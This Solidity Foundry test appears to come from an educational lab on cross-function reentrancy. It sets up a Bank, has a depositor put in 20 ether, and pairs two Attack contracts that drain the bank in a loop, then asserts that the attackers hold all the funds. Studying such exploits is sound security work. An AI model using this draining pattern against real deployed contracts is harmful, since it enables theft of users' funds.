// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Bank} from "../../../src/reentrancy/cross-function/Bank.sol";
import {Attack} from "../../../src/reentrancy/cross-function/Attack.sol";


contract AttackTest is Test {
    Bank bank;
    Attack attack1;
    Attack attack2;
    address ALICE_THE_ATTACKER = makeAddr("alice");
    address DEREK_THE_DEPOSITOR = makeAddr("derek");
    uint256 balanceInit = 1 ether;
    uint256 bankBalanceInit = 20 ether;

    function setUp() external {
        bank = new Bank();
        attack1 = new Attack(bank);
        attack2 = new Attack(bank);
        vm.deal(ALICE_THE_ATTACKER, balanceInit);
        vm.deal(DEREK_THE_DEPOSITOR, bankBalanceInit);
    }

    function test_Attack() external {
        vm.prank(DEREK_THE_DEPOSITOR);
        bank.deposit{value: bankBalanceInit}();

        attack1.setAttackPeer(attack2);
        attack2.setAttackPeer(attack1);

        vm.startPrank(ALICE_THE_ATTACKER);

        attack1.attackInit{value: 1 ether}();

        uint256 bankBalance = address(bank).balance;
        while(bankBalance > 1 ether) {
        attack2.attackNext();
        attack1.attackNext();
        bankBalance = address(bank).balance;
        }
        vm.stopPrank();

        assertEq(address(attack1).balance+address(attack2).balance, bankBalanceInit + balanceInit);
    
    }
}